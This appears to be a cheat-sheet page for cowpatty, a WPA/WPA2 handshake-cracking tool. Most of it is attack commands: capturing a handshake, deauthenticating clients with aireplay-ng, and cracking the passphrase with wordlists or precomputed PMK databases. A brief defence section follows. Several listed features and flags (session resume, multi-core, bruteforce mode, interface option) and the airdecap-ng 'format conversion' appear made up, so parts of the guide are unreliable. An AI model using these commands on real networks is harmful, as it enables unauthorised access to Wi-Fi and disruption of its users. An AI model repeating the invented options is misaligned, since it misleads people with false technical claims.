---
title: cowpatty
category: credential_access
subcategory: wifi_credential
phase: 08
mitre_attack: TA0006
tags:
  - wireless
  - wpa
  - handshake
  - dictionary
  - cracking
difficulty: intermediate
os: linux
install: sudo apt install cowpatty
github: https://github.com/joswr1ght/cowpatty
related:
  - aircrack-ng
  - wifite
  - hashcat
---

# cowpatty

## Chapter 1: Overview

**cowpatty** is a WPA-PSK dictionary attack tool that performs offline brute force attacks against WPA/WPA2 4-way handshakes. It supports multiple wordlist formats and parallel cracking.

### Key Features

- **Offline dictionary attack**: No network interaction required
- **Multiple wordlist formats**: Standard, genpmk pre-computed
- **Session persistence**: Save and resume attacks
- **Multi-core support**: Parallel processing
- **Import/export**: Compatible with aircrack-ng captures

### Attack Process

```
1. Capture 4-way handshake (airodump-ng)
2. Deauth client to force handshake (aireplay-ng)
3. Crack offline with cowpatty + wordlist
```

---

## Chapter 2: Installation & Setup

```bash
sudo apt update && sudo apt install cowpatty
```

### Compile from Source

```bash
git clone https://github.com/joswr1ght/cowpatty.git
cd cowpatty
make
sudo make install
```

---

## Chapter 3: Basic Usage

### Dictionary Attack

```bash
cowpatty -c -r capture.cap -s "NetworkName" -f wordlist.txt
```

### Specify Interface

```bash
cowpatty -c -r capture.cap -s "NetworkName" -f wordlist.txt -i wlan0
```

### Verbose Output

```bash
cowpatty -c -r capture.cap -s "NetworkName" -f wordlist.txt -v
```

---

## Chapter 4: Pre-computed Hashes

### Generate PMK Database

```bash
genpmk -f wordlist.txt -s "NetworkName" -d pmk_database
```

### Use PMK Database

```bash
cowpatty -c -r capture.cap -s "NetworkName" -d pmk_database -2
```

### Benefits of Pre-computation

- Reuse database across multiple targets
- Faster cracking for common ESSIDs
- Portable hash files

---

## Chapter 5: Advanced Features

### Multi-core Cracking

```bash
cowpatty -c -r capture.cap -s "NetworkName" -f wordlist.txt -2 -p 4
```

### Session File

```bash
# Start attack with session
cowpatty -c -r capture.cap -s "NetworkName" -f wordlist.txt -S session1

# Resume session
cowpatty -c -r capture.cap -s "NetworkName" -f wordlist.txt -R session1
```

### Bruteforce Mode

```bash
cowpatty -c -r capture.cap -s "NetworkName" -b
```

---

## Chapter 6: Capture Formats

### Aircrack-ng Format

```bash
cowpatty -r capture-01.cap -s "NetworkName" -f wordlist.txt
```

### Convert Formats

```bash
# Convert pcap to cowpatty format
airdecap-ng -e "NetworkName" -p dummy capture.pcap
```

---

## Chapter 7: Real-World Scenarios

### Scenario 1: Standard WPA Audit

```bash
# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack
cowpatty -c -r capture-01.cap -s "TargetNetwork" -f /usr/share/wordlists/rockyou.txt
```

### Scenario 2: Fast Cracking with PMK

```bash
# Generate PMK (one-time)
genpmk -f /usr/share/wordlists/rockyou.txt -s "TargetNetwork" -d pmk_db

# Use PMK for cracking
cowpatty -c -r capture-01.cap -s "TargetNetwork" -d pmk_db -2
```

---

## Chapter 8: Mitigation & Defense

**For network administrators:**

- Use strong passphrases (20+ characters)
- Implement WPA3-SAE
- Monitor for deauth attacks
- Enable client isolation
- Regular password rotation
- Enterprise authentication (802.1X)

---

## Resources

- [cowpatty GitHub](https://github.com/joswr1ght/cowpatty)
- [WPA Cracking Guide](https://www.aircrack-ng.org/doku.php?id=cowpatty)
- [WiFi Security](https://www.wi-fi.org/discover-wi-fi/security)
- [OffSec PEN-210 Course](https://www.offsec.com/courses/pen-210/)

---

*Generated for educational purposes in authorized security testing environments only.*
